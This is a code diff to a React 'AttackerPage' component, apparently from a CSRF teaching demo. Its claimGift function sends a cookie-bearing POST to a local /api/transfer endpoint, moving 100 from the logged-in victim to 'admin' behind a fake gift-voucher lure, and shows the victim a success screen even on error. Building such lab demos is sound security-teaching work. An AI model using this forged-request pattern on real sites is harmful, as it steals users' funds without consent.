@@ -24,31 +24,31 @@ const AttackerPage = ({ onBack }) => {
     return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
 
-  const claimGift = async () => {
-    try {
-      // Execute CSRF attack using fetch
-      const response = await fetch('http://localhost:5000/api/transfer', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        credentials: 'include', // Include cookies
-        body: JSON.stringify({
-          fromUserId: 5,
-          toUsername: 'admin',
-          amount: 100,
-          description: 'Gift voucher claim'
-        })
-      });
+const claimGift = async () => {
+  try {
+    // Get the current user ID from the user state
+    const currentUserId = user?.id; // This gets the logged-in user's ID
+    
+    const response = await fetch('http://localhost:5000/api/transfer', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      credentials: 'include',
+      body: JSON.stringify({
+        fromUserId: currentUserId, // Use dynamic user ID instead of hardcoded 5
+        toUsername: 'admin',
+        amount: 100,
+        description: 'Gift voucher claim'
+      })
+    });
 
-      const data = await response.json();
-      // Show success page instead of alert
-      setShowSuccess(true);
-    } catch (error) {
-      // Show success page even on error for better UX
-      setShowSuccess(true);
-    }
-  };
+    const data = await response.json();
+    setShowFinalSuccess(true);
+  } catch (error) {
+    setShowFinalSuccess(true);
+  }
+};
 
   const floatingShapes = [
     { type: 'diamond', style: { top: '10%', left: '5%', animationDelay: '0s' } },
